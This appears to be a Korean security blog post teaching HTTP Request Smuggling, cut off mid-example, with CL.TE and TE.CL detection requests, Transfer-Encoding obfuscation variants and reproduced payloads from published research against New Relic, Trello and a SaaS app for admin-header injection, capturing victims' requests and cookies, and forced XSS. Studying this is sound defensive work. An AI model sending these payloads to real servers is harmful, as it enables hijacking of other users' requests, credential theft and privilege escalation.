---
layout: post
title: HTTP Request Smuggling(HRS)
date: 2022-09-05 22:48 +0900
tags: [web, fundamental, http, hrs]
categories: [web, vulnerability]
toc: true
---


## Introduction

'HTTP Request Smuggling' 또는 'HTTP Desync Attack'이라고 알려진 이 공격은 2019년 BlackHat Conference에서 James Kettle이라는 Burp Suite 연구원이 기존에 있던(2005년에 WatchFire에 의해 발표되었으나 큰 조명을 받지 못했다) 공격 방법이자 실제 리얼월드에서 사용할 수 없는 공격이라고 알려진 "HTTP Request Smuggling" 공격에 대해 발표를 했다. 

- [https://www.youtube.com/watch?v=_A04msdplXs&ab_channel=BlackHat](https://www.youtube.com/watch?v=_A04msdplXs&ab_channel=BlackHat)

해당 공격에 대한 반응은 당시에 매우 뜨거웠으며 이 공격을 이용한 다수(20개가 넘는)의 Bug Bounty가 나왔다. (작게는 750달러에서 많게는 6500달러 까지 받은 것을 확인했다)

- [https://hackerone.com/reports/726773](https://hackerone.com/reports/726773)
- [https://hackerone.com/reports/737140](https://hackerone.com/reports/737140)

또한 이 취약점을 이용한 CTF 문제가 2020년 Defcon 예선전에서 나오면서 사람들은 더 관심을 갖게 되었고, 더욱 다양한 방법으로 해당 취약점을 탐지하고 우회하는 방법이 나왔다. 그러나, 이 취약점은 라이브 서비스에 공격하기에는 타 유저들에게도 영향을 미칠 수 있으며, 공격이 통했음에도 확인하지 못하는 상황이 종종 발생한다.

- [https://ctftime.org/writeup/20655](https://ctftime.org/writeup/20655)

## Background

HTTP Request Smuggling 공격에 대해 들어가기 전에 먼저 HTTP 요청의 구조에 대해서 이해할 필요가 있다. 그 이유는 HTTP Request Smuggling은 HTTP 구조를 변조하고 이를 이용해 1개의 Header를 서버가 마치 2개인것 처럼 인식하게 만드는 것이 목표이기 때문이다.

HTTP Header에는 크게 4가지 종류가 존재한다.

1. General Header
2. Request Header
3. Response Header
4. Entity Header

이중에서 집중해서 봐야할것은 바로 Request Header다. Request Header의 구조를 살펴보자.

![GET Method HTTP Request](/assets/img/20220905/Untitled.png)

GET Method HTTP Request

![POST Method HTTP Request](/assets/img/20220905/Untitled%201.png)

POST Method HTTP Request

기본적으로 헤더는 크게 'Start Line'(First Line이라고도 불리며, 특별한 이름이 없는 경우도 있지만 요기서는 Start Line이라 부르겠다), 'Header' 부분과 'Body'부분으로 나뉜다. 그리고 'Start Line' 과 'Header' 뒤에 'Body'가 들어오면 한개의 CRLF(Carriage Return, Line Feed)로 구분을 하고, 안온다면 두개의 CRLF로 끝을 나타낸다. 

### Start Line

Start Line은 이름 그대로 시작을 알리는 부분입니다. 대부분의 경우 이를 Header의 일부분으로 포함시켜 보는 사람들이 많지만, 이를 분리해서 보는 경우도 많다. (Start Line, First Line, 등으로 불리는 경우도 있지만, 특별한 이름이 안붙는 경우도 있다. 그러나 다른 헤더와는 다른 성격을 지니고 있기 때문에 분리했다)

Start Line안에는 3가지 부분으로 구성된다.

1. HTTP Request Method (OPTIONS, GET, POST, HEAD, etc.)
2. URI (/login, /index.html, etc.)
3. HTTP Version (HTTP/1.1, HTTP/2, etc.)

### Header

Header에는 요청에 대한 추가적인 정보가 담겨 있다. 예를 들면 어떤 타입의 요청인지(Content-Type), 호스트가 어딘지(Host), Body의 길이가 어느정도인지(Content-Length) 그리고 이 정보는 Key: Value 형식으로 이루어져 있다. 예를 들면 Host: www.google.ca 에서 Key는 Host고 Value는 www.google.ca다.

이 Header정보에서 중요하게 봐야할 것은 총 3가지이다. 

1. Connection : 현재의 전송이 완료된 후 네트워크 접속을 유지할지 말지를 제어하는 역할을 한다. Ex: keep-alive (HTTP/2 에서는 사용을 금지한다)
2. Content-Length : Body부분에 얼마나 큰 길이의 요청을 보내는지 가르쳐주는 역할을 한다.
3. Transfer-Encoding : Content-Length와 유사한 역할을 하지만, 정확히 얼만큼의 크기를 보내는지에 대한 정보는 없고 어떻게 보내는지 가르쳐준다 (데이터의 형태/ 인코딩 형태) Ex: Chunked

### Body

Header와 CRLF로 구분되어 있으며, Header부분에 Content-Length 혹은 Transfer-Encoding이 있어야 인식이 가능하다. GET Request의 Parameter와 같이 Data를 보낼 때 이 부분에 넣어 보낸다.

Transfer-Encoding으로 요청을 보낼때는 기존 Data보내는 방식과는 다르다. Tranfser-Encoding: Chunked일 때는 아래와 같이 문자열의 길이 > CRLF > 문자열 > ... > 0 (끝) > CRLF로 나타낸다.

```
POST / HTTP/1.1
Content-Type: text/plain
Transfer-Encoding: chunked

7\r\n
Dryandy\r\n
4\r\n
Test\r\n
0\r\n
\r\n
```

- 만약 Header 안에 Content-Length와 Transfer-Encoding이 공존한다면 어떻게 될까?

## Impact Radius

HTTP Request Smuggling 공격은 모든 유저에게 영향을 끼치는 공격이 아니다. 해당 공격은 3가지 범위의 공격을 정의 할 수 있다.

1. Self Desync
2. IP Desync
3. Open Desync

![/assets/img/20220905/Untitled%202.png](/assets/img/20220905/Untitled%202.png)

### 1. Self Desync

Self Desync는 Self XSS(Cross Site Scripting)과 매우 유사하다. 쉽게 표현하자면 오로지 본인한테만 영향을 끼치는 유형이다. 

![/assets/img/20220905/Untitled%203.png](/assets/img/20220905/Untitled%203.png)

위 그림을 살펴보면 Front-End에서 Back-End로 넘어가는 Pipeline에서 IP별로 Pipeline이 있는것을 확인 할 수 있다. Self-Desync는 다른 유저들에게 아무런 영향이 없으며, Impact가 다소 낮다고 평가 되어 있다. Self-Desync는 Self-XSS처럼 무의미해 보일 수 있으나, 모든 종류의 Desync로 404 혹은 403으로 볼 수 없었던 내부 데이터 열람이 가능한 경우가 있다.

### 2. IP Desync

IP Desync는 Self Desync와는 다르게 다른 대상에게도 영향을 끼칠 수 있지만, 같은 IP 대역에 있는 사용자들에게만 영향을 끼칠 있다.

![/assets/img/20220905/Untitled%204.png](/assets/img/20220905/Untitled%204.png)

### 3. Open Desync

마지막으로 Open Desync는 모든 사용자들의 Request를 하나의 Pipeline로 처리하는 것을 일컫는다. Open Desync의 유형이 가장 Impact가 크며, 취약점을 찾고 Exploit하는 것이 트래픽이 많은 시스템일수록 어렵다.

![/assets/img/20220905/Untitled%205.png](/assets/img/20220905/Untitled%205.png)

## What is HTTP Request Smuggling?

HTTP Request Smuggling 공격을 간단히 설명하자면 HTTP Request에서 Header 부분을 2개를 보내 일종의 Cache Poisoning을 만드는 공격을 일컫는다. HTTP Request Smuggling은 각종 제어들을 우회하거나, 민감정보에 접근을 가능하게 하고 다른 유저들에게 어떤 페이지/행동을 유도할 수도 있다는 점에서 이 공격으로 연계가능한 공격은 무궁무진하다.

일반적으로 유저가 웹을 통해 한 서버와 통신을 하기 위해서는 많은 단계를 거친다. 가장 기본적으로 HTTP 통신을 통해 패킷을 보내게 되고, 이런 패킷들은 Pipeline 형식으로 Backend로 전달되게 된다.

![/assets/img/20220905/Untitled%206.png](/assets/img/20220905/Untitled%206.png)

HTTP Request Smuggling 공격은 공격자가 하나의 패킷을 보내는데 Front-End는 이를 하나의 패킷으로 인식하지만, Back-End는 이를 별개의 요청으로 인식해 다음 패킷에 붙어서 Back-End로 전달되게 된다. (아래 그림에서 주황색으로 표현된 패킷)

![/assets/img/20220905/Untitled%207.png](/assets/img/20220905/Untitled%207.png)

위 그림을 좀 더 상세한 예제로 살펴보자. 아래와 같은 HTTP Header로 공격자가 Front-End Server에 공격을 요청한다고 가정해 보자.

```
POST / HTTP/1.1
HOST: vulnerable.com
Content-Type: text/plain
Content-Length: 43
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Foo: X
```

만약 HTTP Request Smuggling 공격이 통한다면 Back-End Server는 아래와 같은 2개의 요청으로 인식하게 된다.

```
POST / HTTP/1.1
HOST: vulnerable.com
Content-Type: text/plain
Content-Length: 43
Transfer-Encoding: chunked

0
```

```
GET /admin HTTP/1.1
Foo: X
```

하지만 이 방식은 리얼 월드에서 사용하기에는 큰 무리가 있다. 바로 Content-Length와 Transfer-Encoding은 함께 사용할 수 없다는 이유 때문이다. 

```
If a message is received with both a Transfer-Encoding header field and a Content-Length 

header field, the latter MUST be ignored.
```

RFC 2616에 따르면. Content-Length와 Transfer-Encoding이 함께 사용된다면, 후자에 오는 것이 무시된다고 한다. 

그러면 어떻게 하면 될까? Transfer-Encoding: chunked를 은닉해서 통신 구간에서 알아차리지 못하게 하고, Front-End 혹은 Back-End가 이를 인식하게 되게 하면 된다. 아래 방법들은 몇몇 서버들이 인식하는 Transfer-Encoding 방식이다. (참고: Transfer-Encoding을 사용할 때 Body에 명시하는 chunk의 길이는 16진수다)

```
Transfer-Encoding: xchunked
```

```
Transfer-Encoding : chunked
```

```
Transfer-Encoding: chunked
Transfer-Encoding: x
```

```
Transfer-Encoding:[tab]chunked
```

```
GET / HTTP/1.1
 Transfer-Encoding: chunked
```

```
X: X[\n]Transfer-Encoding: chunked
```

```
Transfer-Encoding
 : chunked
```

HTTP Request Smuggling을 공격하다 보면 크게 2가지 방법으로 Test를 진행시키는 방법이 있다.

1. 먼저 상대적으로 쉬운 방법으로는 Attack Request만 보내 임의의 피해자가 이를 Trigger 시켜 원하는 Response를 유도하는 방법이다.
2. 그리고 조금 더 어렵고 복잡한 공격은 Attack과 Victim Request를 둘 다 보내 Web Cache에 저장시켜 같은 URL에 접속하는 임의의 사용자에게 Response를 강요 시키는 방법이다. (Web Cache Poisoning)

당연히 이 중에서 1번은 일반 유저에게 피해를 입힐 수 있다는 단점이 있다. 그러므로 모든 Test는 본인에게만 공격이 오게 유도하는 것이 매우 중요하다.

## Methodology (By James Kettle)

공격하는 사람 입장에서는 Front-End 뒤에 어떤 동작을 하는지 파악하기 매우 어렵다. (거의 불가능에 가깝다고 보는게 편하다) James Kettle (HTTP Desync Reborn의 저자)는 간단한 Methodology를 구상했으며 그 그림은 아래와 같다.

![[https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn)](/assets/img/20220905/Untitled%208.png)

[https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn)

너무나도 당연한 얘기이며 James Kettle의 Methodology에 대해 좀 더 깊이 이해해보자.

- 공격에 들어가기 전에 공격을 실제로 시도할 때는 Burp Suite의 Turbo Intruder을 사용해서 공격을 시도하는 것이 가장 기본 방법이다. 한개의 공격 Packet을 보내고 정상 Packet 여러개를 이어서 보내 자기 자신이 감염되도록 유도해야한다. 그 외에는 Python Script를 본인이 짜서 해보는 방법이 있다.

### 1. Detect

가장 간단하고 효과적인 방법은 Attack Request 직후, Normal User Request를 통해 Exploit이 가능한지 판별하는 방법이다. 그러나 이 방법에는 큰 오류가 존재한다. 만약 이 서버가 대규모 트래픽이 있는 라이브 서버라고 가정해보자. 그러면 공격자가 탐지를 하고 확신하기 전까지 다른 유저들에게 영향을 줄수도 있고, 탐지를 못해여 False Positive를 불러올 수 있다. 

James Kettle은 이런 문제점을 해결하고자 아래와 같은 페이로드를 만들었다. (Front-End가 Content-Length를 사용하고, Back-End가 Transfer-Encoding을 사용한다고 가정 = CL.TE)

```
POST /about HTTP/1.1
Host: example.com
Transfer-Encoding: chunked
Content-Length: 4

1\r\n
Z\r\n
Q
```

위의 경우를 살펴보자. 먼저 Front-End는 Content-Length만 볼 것이다. 그리하여 크기가 4이기 때문에 `1\r\nZ`가 넘어가 `Z`까지 Back-End로 Request가 넘어갈 것이다. 그리고 Back-End는 Transfer-Encoding을 보기 때문에, Chunk가 `0`으로 끝나지 않아 다음 Chunk 요청을 기다리고, 요청이 안오면 Time-Out이 발생하여 연결이 자연스럽게 끊길 것이.

만약 서버가 동일한 Header를 사용한다면(CL.CL 혹은 TE.TE) Front-End로 부터 거부당하거나, 위험 없이 두 서버에 모두 수행될 것이다. 만약 반대로 TE.CL 구조로 서버가 이루어져있다면 `Q`라는 Invalid Chunk Size로 인해 Back-End로 가지 않고 요청은 끊길 것이다.

**CL.TE TEST**

![Attacker : Time Out 유도 Request Packet](/assets/img/20220905/Untitled%209.png)

Attacker : Time Out 유도 Request Packet

![Attacker : 공격 Packet 전송](/assets/img/20220905/Untitled%2010.png)

Attacker : 공격 Packet 전송

![Victim Request](/assets/img/20220905/Untitled%2011.png)

Victim Request

그러면 TE.CL Request는 어떻게 탐지 할까? 다음 Request를 보자.

```
POST /about HTTP/1.1
Host: example.com
Content-Length: 3
Transfer-Encoding: chunked

8\r\n
SMUGGLED\r\n
0\r\n
\r\n
\r\n
```

Front-End는 `Transfer-Encoding: chunked`만 보기 때문에 chunked의 끝을 알리는 `0`까지만 보고 Back-End로 보낼 것이다. 그러나 Back-End는 `Content-Length: 3`을 바라보고 `SMUGGLED\r\n0`는 백앤드에 남아 다음 요청의 앞부분으로 여겨져 Back-End에 남아결국 Time-Out 혹은 다른 사용자의 패킷 앞에 붙게 될 것이다.

TE.CL에서 매우 중요한 부분 중 하나는 마지막에 2개의 빈칸(`\r\n\r\n`)이 0뒤에 와야한다는 것이다.

**TE.CL TEST**

![Attacker Request](/assets/img/20220905/Untitled%2012.png)

Attacker Request

![Victim Request](/assets/img/20220905/Untitled%2013.png)

Victim Request

![Attacker Request](/assets/img/20220905/Untitled%2014.png)

Attacker Request

![Victim Request](/assets/img/20220905/Untitled%2015.png)

Victim Request

- 공격의 안정성을 위해 **CL.TE를 먼저 테스트한 후 TE.CL 테스트 하는 것을 권장 한다.**  그 이유는 TE.CL 공격은 타 사용자에게 피해를 줄 수 있기 때문이다. 만약 CL.TE라면 TE.CL로 피해를 줄 가능성을 없에고 테스트가 가능하기 때문이다.(현재 Burp Suite Extension으로 HTTP Request Smuggler가 존재하고 이를 통해 공격 확인도 가능하다)

### 2. Confirm

공격을 진행하다 보면 Back-End 서버는 Connection을 끊고 Poison된 버퍼를 버릴수도 있다. 이를 피하기 위해서는 기본적으로 POST Request를 받기로 예정된 타겟에 공격을 날리는 것이 효과적이다. 다시 말해, 원래 요청이 웹 애플리케이션에서 POST Request를 받던 곳에 POST Request를 날리는 것이 공격 성공 가능성을 크게 향상 시킬 수 있다.

또한 일부 Back-End 서버는 각 요청, URL, Header등을 다른곳(예를 들면 Load-Balancer가 요청들을 분류해서 다른 Back-End Server에서 처리하도록 지시할 수도 있다)에서 처리하는 경우도 있다. 이를 피하기 위해 '공격자' 즉, 'Attacker'의 Request와 '피해자', 'Victim'의 Request를 최대한 유사하게 만드는 것이 핵심이다.

예를 들면 만약 기본 POST Request가 아래와 같다고 보자.

```
POST /search HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```

그러면 CL.TE 공격은 아래와 같이 될 것이다.

```
POST /search HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Transfer-Encoding: zchunked

e
q=smuggling&x=
0

GET /404 HTTP/1.1
Foo: bPOST /search HTTP/1.1
Host: example.com
…
```

만약 이 공격이 성공적이라면, `GET /404 HTTP/1.1\r\nFoo: b` 부분이 사용자의 Request `POST /search HTTP/1.1...` 앞에 붙어 사용자의 Request Header의 Start Line은 `GET /404 HTTP/1.1`이 될 것이고 사용자에게 404 Response를 유도할 것이다. (`q=smuggling&x=`이라고 적힌 부분은 실제 공격에서는 정상적으로 보내지는 parameter와 value가 될것이다.)

다음은 TE.CL 공격의 예시다. 해당 공격은 전(CL.TE)과는 조금 다른 성격을 띈다. 그 이유는 Chunk를 직접 닫아줘야하기 때문에 Header의 모든 값들을 직접 입력해주고 피해자의 Request를 Body에 넣어야한다. 그리고  Prefix에 있는 Content-Length가 body보다는 커야한다.

```
POST /search HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: zchunked

96
GET /404 HTTP/1.1
X: x=1&q=smugging&x=
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

x=
0

POST /search HTTP/1.1
Host: example.com
```

위의 예시에서는 `96`과 `0`사이의 Chunk(`GET /404 HTTP/1.1 ~~ 0`)가 Back-End로 보내질 것이다. 그리고 Back-End에서는 Content-Length를 바라보기 때문에 `96\r\n`만 보고 `GET /404 HTTP/1.1 ...` 부분은 남아 있을 것이다. 그리고 이게 뒤에 오는 유저의 요청(`POST /search HTTP/1.1 ...`) 앞에 붙어 Header역할을 수행할 것이다. 그렇기 때문에 TE.CL 공격은 CL.TE 와는 달리 Header의 Head 부분에 Start-Line 뿐만아니라, 주요 Key와 Value들을 명시해야한다. 바로 이 점 때문에 CL.TE에 비해 TE.CL이 다소 어렵다.

또한 이 공격으로 다른 유저의 요청에 영향을 끼칠 수 있다. 그리고 트래픽이 많은 사이트일수록 본인이 확인하기 어려워울 수 있어 공격을 테스트하기 위해 조심할 필요성이 있다.

### 3. Explore & Exploit

Front-End는 가끔 Back-End로 요청을 전달 할 때 HTTP Request Header를 재작성하는 경우가 많다. 예를 들면 `X-Forwarded-For`, `X-Forwarded-Host`, `X-Forwarded-Proto`같은 헤더를 덧붙이는 경우도 있고, 완전히 자체 제작된 헤더를 덧붙여 공격을 하기에 더 어렵게 만드는 경우가 많다. 다행이도 이 보이지 않는 헤더들을 알아내는 방법이 존재한다. 그리고 이를 수동으로 추가함으로써 더 많은 가능성을 열어준다.

먼저 `X-Forwarded-For`과 `X-Forwarded-Host`를 알고 넘어가자. 이 둘은 Front-End에서 Back-End로 넘어갈때 Header에 추가되는 경우가 있어 알아두면 좋다.

- `X-Forwarded-For`: 이 헤더는 HTTP 프로식 혹은 로드 밸런서(Load-Balancer)를 통해 웹 서버에 접속하는 Client의 원래 IP주소를 식별하기 위한 표준 헤더다. 클라이언트의 원래 IP주소를 담는 이유는 Client와 Server 사이에서 트래픽이 프록시 혹은 로드 밸런서를 거치면, 서버 접근 로그에는 프록시/로드 밸런서의 IP주소만을 담고 있는 경우가 있어, Client의 IP를 보존하기 위해 X-Forwarded-For 헤더를 사용한다. 또한 HTTP-Request-Smuggling에서도 이 처럼 X-Forwarded-For 헤더가 붙는 경우가 있어, 이를 수동으로 추가 해줘야하는 경우가 있다.
    
    [https://developer.mozilla.org/ko/docs/Web/HTTP/Headers/X-Forwarded-For](https://developer.mozilla.org/ko/docs/Web/HTTP/Headers/X-Forwarded-For)
    

- `X-Forwarded-Host`: HTTP Request Header에서 클라이언트가 요청한 원래 Host Header를 식별히는데 사용되는 표준 헤더다. Reverse Proxy(Load-Balancer, CDN)에서 Host 이름과 포트는 요청을 처리하는 Origin과 다를 수 있다.  이런 경우 이 헤더를 사용하여 원래 사용된 Host를 확인 하는데 사용된다.
    
    [https://developer.mozilla.org/ko/docs/Web/HTTP/Headers/X-Forwarded-Host](https://developer.mozilla.org/ko/docs/Web/HTTP/Headers/X-Forwarded-Host)
    

- `X-Forwarded-Proto`: Client가 서버의 프록시 또는 로드밸런서에 접속하는데 사용했던 프로토콜이 무엇인지(Ex: HTTP/HTTPS) 확인하기 위한 헤더다. 서버 접근 로그들에는 서버와 로드 밸런서 사이에서 어떤 프로토콜을 사용했는지 포함한다. 그러나 Client와 로드 밸런서 사이의 프로토콜은 포함하지 않는다. 그렇기 때문에 Client와 로드 밸런서 사이에 어떤 프로토콜을 사용했는지 확인하기 위해 사용된다.
    
    [https://developer.mozilla.org/ko/docs/Web/HTTP/Headers/X-Forwarded-Proto](https://developer.mozilla.org/ko/docs/Web/HTTP/Headers/X-Forwarded-Proto)
    

먼저 앞서 말했다 싶히, 공격의 핵심은 POST Request를 날릴 수 있는 Entry Point를 찾고 이를 요청의 뒷부분(`POST /login HTTP/1.1 ~~ login[email]=asdf`)으로 바꿔서 요청을 날리는 것이다. (아래의 예는 James Kettle이 직접 버그바운티를 하며 찾은 예시다)

```
POST / HTTP/1.1
Host: login.newrelic.com
Content-Length: 142
Transfer-Encoding: chunked
Transfer-Encoding: x

0

POST /login HTTP/1.1
Host: login.newrelic.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100
…
login[email]=asdfPOST /login HTTP/1.1
Host: login.newrelic.com
```

위 사이트에서 공격을 진행하다 CL.TE 공격이 통하는 Entry-Point를 찾았다. 

먼저 `Content-Length: 142`로 인해 `POST /login HTTP/1.1 ~~ login[email]=asdf`까지 요청이 Back-End로 넘어갈 것이다. 그리고 `Transfer-Encoding: chunked`로 인해 0까지 인식을 하고 `POST /login HTTP/1.1 ~~ login[email]=asdf`은 Back-End에 남아 있을 것이다. 그리고 사용자의 요청이 오면 사용자의 요청 앞에 `POST /login HTTP/1.1 ~~ login[email]=asdf` Header가 붙여질 것이다. 그리고 사용자의 요청이 불안정한 POST의 Body에 덧붙여 졌기 때문에 Response의 HTML 코드 안에, 그 Header가 Leak될 것이다. (아래의 `POST /login HTTP/1.1 ~~ external`) 그리고 `POST /login HTTP/1.1 ~~ login[email]=asdf`의 Content-Length 값을 증가시켜 Leak할 수 있는 내용을 점점 더 늘릴 수 있다. 

```
Please ensure that your email and password are correct.

<input id="email" value="asdfPOST /login HTTP/1.1
Host: login.newrelic.com
X-Forwarded-For: 81.139.39.150
X-Forwarded-Proto: https
X-TLS-Bits: 128
X-TLS-Cipher: ECDHE-RSA-AES128-GCM-SHA256
X-TLS-Version: TLSv1.2
x-nr-external-service: external
```

요기서 핵심은 `POST /login HTTP/1.1 ~~ login[email]=asdf`의 Content-Length를 늘릴 수록 더 많은 Response를 읽을 수 있다는 것이다. 더 많은 Header들을 Leak시켜 어떤 주요 Header들이 필요한지 파악할 수 있다.

많은 시스템들은 Front-End에 의존적이다. 그리고 Back-End에는 어떠한 보안도 적용되지 않는 경우가 많다. 해당 예에서는 Back-End가 또 다른 Proxy Server였다고 James Kettle이 설명했다. 그리고 모든 서버는 결국 Redirection으로 Response를 보냈다고 한다.

```
...
GET / HTTP/1.1
Host: staging-alerts.newrelic.com

```

```
HTTP/1.1 301 Moved Permanently
Location: https://staging-alerts.newrelic.com/
```

Redirection 때문에 어떤 Header들이 Back-End에서 사용되는지 판단하기 어렵다. 이 문제를 해결하기 위해서 다양한 Header들(`X-Forwarded-For`, `X-Forwarded-Host` 등)을 사용하였고, 이 중에서 특이한 반응을 보인것은 `X-Forwarded-Proto`라고 한다.

```
...
GET / HTTP/1.1
Host: staging-alerts.newrelic.com
X-Forwarded-Proto: https
```

```
HTTP/1.1 404 Not Found

Action Controller: Exception caught
```

`X-Forwarded-Proto`를 사용하니 다른 메시지가 출력되었다. 그러나 아직 완전한 요청을 보낸 것이 아닌 404로 인해 원하는 기능을 수행하거나, 공격에 사용하기에는 무리가 있다. 그리하여 공격 가능한 Entry-Point를 찾다 아래의 URI에서 200이 뜨는 것을 확인했다고 한다.

```
...
GET /revision_check HTTP/1.1
Host: staging-alerts.newrelic.com
X-Forwarded-Proto: https
```

```
HTTP/1.1 200 OK

Not authorized with header:
```

이 오류 메시지로 어떠한 Authorization Header가 필요하다는 것을 알 수 있었고, 전에 다른 Entry-Point에서 봤던 `X-nr-external-service` 헤더를 사용했다.

```
...
GET /revision_check HTTP/1.1
Host: staging-alerts.newrelic.com
X-Forwarded-Proto: https
X-nr-external-service: 1
```

```
HTTP/1.1 403 Forbidden

Forbidden
```

안타깝게도 결과는 실패로 돌아갔다. URL에 직접 접속했을 때 나오는 에러와 동일한 에러가 발생되는 것을 확인 할 수 있었고, 이것이 의미하는 바는 다음과 같다. 

- Front-End는 인터넷을 통해 요청이 들어왔음을 `X-nr-external-service` 헤더를 통해 알리고 있었고, 이를 없에므로써 내부에서 요청이 들어왔다는 것을 알리는 역할을 하는 것이다.

이것은 매우 유용한 정보지만, 아직 어떤 Authorization Header가 필요한지 알 수 없다.

이를 알기 위해 다양한 방법이 존재하겠지만(예를 들면 processed-request-reflection technique), James Kettle은 전에 New-Relic에서 취약점을 찾았을 때를 참고 했다. 그리고 `Server-Gateway-Account-Id` 및 `Service-Gateway-Is-Newrelic-Admin` 이라는 매우 유용한 헤더를 알게되었다. 그리고 결과론적으로 Admin 권한으로 모든 API를 통제 할 수 있었다.

```
POST /login HTTP/1.1
Host: login.newrelic.com
Content-Length: 564
Transfer-Encoding: chunked
Transfer-encoding: cow

0

POST /internal_api/934454/session HTTP/1.1
Host: alerts.newrelic.com
X-Forwarded-Proto: https
Service-Gateway-Account-Id: 934454
Service-Gateway-Is-Newrelic-Admin: true
Content-Length: 6
…
x=123GET...
```

```
HTTP/1.1 200 OK

{
  "user": {
     "account_id": 934454,
     "is_newrelic_admin": true
  },
  "current_account_id": 934454
  …
}
```

참고: [https://hackerone.com/reports/498052](https://hackerone.com/reports/498052)

이 공격으로 API만 포이즈닝 할 수 있는 것이 아니다. 다양한 공격을 위해서는, 해당 취약점으로 무엇을 할 수 있는지 이해하는 것이 중요하고, 어떤 Request들을 감염 시킬 수 있는지 이해하는 것이 핵심이다. 'Confirm' 단계에서 했던 공격을 반복하면서 '피해자'의 공격을 조금식 변조하며 정상적인 공격 Request가 될 때까지 반복해보면, 특정 IP의 대상 혹은 특정 Method를 사용하는 대상들만 공격 할 수 있음을 확인할 수 있다.

그리고 마지막으로 Web-Cache를 사용하는지 확인해야한다. 이를 통해 다양한 방어 기법들을 우회할 수 있으며 해당 공격의 위험성을 배로 불릴 수 있다.

### 4. Storing the Header

만약 공격 대상에 글을 작성 혹은 수정하는 기능이 존재한다면, Explore & Exploit 단계가 매우 쉬워진다. 피해자의 Request Packet을 공격자의 글 작성/수정 페이지에 저장하는 요청을 삽입해 Web App의 Request를 저장 시켜 최종적으로 Authentication Header 및 Cookie를 탈취 할 수 있다. (HTTP-Only로 인해 막힌 Cookie 탈취가 가능해진다는 것은 매우 큰 위험이다) 

다음은 James Kettle이 발견한 Trello의 profile-edit 기능을 사용한 공격이다.

```
POST /1/cards HTTP/1.1
Host: trello.com
Transfer-Encoding:[tab]chunked
Content-Length: 4

9f
PUT /1/members/1234 HTTP/1.1
Host: trello.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 400

x=x&csrf=1234&username=testzzz&bio=cake
0

GET / HTTP/1.1
Host: trello.com
```

위 공격은 TE.CL 공격이다. `Transfer-Encoding: [tab]chunked`로 인해 Back-End로 `PUT /1/members/1234 HTTP/1.1 ~~ cake\r\n0`까지 전달될 것이다. 그리고 Back-End는 Content-Length만 보기 때문에 `9f\r\n`(Size: 4)까지만 보고 `PUT /1/members/1234 HTTP/1.1 ~ cake\r\n0`은 Back-End에 남아 있을 것이다. 그리고 사용자의 패킷이 들어오면, `PUT /1/members/1234 HTTP/1.1 ~ cake\r\n0`의 Body역할을 수행하며 저장될 것이다.

![/assets/img/20220905/Untitled%2016.png](/assets/img/20220905/Untitled%2016.png)

해당 공격의 유일한 단점은 '&'뒤에 오는 모든 내용을 잃는 다는 것이다. 

### 5. Chaining the Attack

HTTP Request Smuggling 공격으로 발생 시키기 다소 어려웠던 다른 공격들을 연계하는 사례가 많이 있다. 예를 들면 User Interaction이 필요했거나, 현실성이 낮았던 공격들까지 HTTP Request Smuggling으로 인해 전혀 Interaction이 필요 없거나, 그 공격의 범위와 파괴력이 배로 증가한다.

HTTP Request Smuggling의 대표적인 장점으로는 피해자에게 Header Prefix를 강제로 삽입시켜 원하는 Reponse가 나오게 유도할 수 있다는 것이다. 

**Upgrading XSS**

가장 대표적인 방법으로는 Reflected XSS가 있다. Reflected XSS는 Stored와 달리 사용자가 해당 URL에 직접 접속해야 한다는 단점을 갖고 있다. 즉, User Interaction이 필요해, 그 공격의 파급력이 Stored XSS에 비해 낮게 평가돼 있다. 그러나 HTTP Request Smuggling과 연계된다면 Back-End에 남아, 마치 Stored XSS 처럼 공격이 강제화 될 수 있다. 

아래의 예시를 한번 살펴보자. (해당 예시는 James Kettle이 제시한 예시다)

```
POST / HTTP/1.1
Host: saas-app.com
Content-Length: 137
Transfer-Encoding : chunked

10
=x&cr={creative}&x=
0
POST /index.php HTTP/1.1
Host: saas-app.com
Content-Length: 200

SAML=a"><script>alert(1)</script>POST / HTTP/1.1
Host: saas-app.com
Cookie: …
```

먼저 위의 예시는 CL.TE 공격이다. Content-Length로 인해 `SAML=a"<script>alert(1)</script>`까지 Back-End로 전달될 것이다. 그 다음 Transfer-Encoding으로 인해 `POST /index.php HTTP/1.1 ~~ alert(1)</script>`은 Back-End에 남아 피해자의 요청이 이어지기를 기다릴 것이다. 피해자의 요청 `POST / HTTP/1.1 ...`이 오면, `POST /index.php HTTP/1.1 ~~ alert(1)</script>` 뒤에 붙어, 강제로 RXSS 요청을 보내, XSS를 실행시킬 것이다.

```
HTTP/1.1 200 OK
…
<input name="SAML"   value="a"><script>alert(1)</script>
0

POST / HTTP/1.1
Host: saas-app.com
Cookie: …
"/>
```

**Going Beyond '404'**

HTTP Request Smuggling은 단순히 상대방을 강제화 하는데서 끝나지 않는다. 2020년에 있었던 NahamCon2020에서 Evan Custodio는 HTTP Request Smuggling으로 가능한 Practical Attack들에 대해서 설명을 했다. 그중에서 `404 Not Found`(실제로 존재하지만 일반 유저가 접근 못하게 막은 URI)로 일반 유저가 접근 할 수 없는 디렉토리의 정보를 읽는 방법에 대해서 설명하였다.

먼저 'example.com' (예시) 사이트에서 HTTP Request Smuggling 공격을 시도해보고 TE.CL이 적용된다는 사실을 알게되었다. 그러나 불행하게도 공격은 Self-Impact로, 자기 자신한테만 영향을 끼친다는 사실을 타 IP로 공격이 통하는지 Testing하다 알게되었다.
그 후 Evan Custodio는 'robots.txt'파일을 살펴보았다.

```
User-agent: *
Disallow: /account.jsp
Disallow: /api
Disallow: /controlroom
Disallow: /sales
```

그리고 /controlroom URI에 집적 접속해본 결과 `404 Not Found`가 떴다.

![/assets/img/20220905/Untitled%2017.png](/assets/img/20220905/Untitled%2017.png)

TE.CL HTTP Request Smuggling 공격이 통하기 때문에, 호기심에 해당 도메인에 자기 자신한테 공격을 시도해보았다. 

```
POST / HTTP/1.1
Transfer-Encoding: chunked
Host: example.com
Content-Length: 4

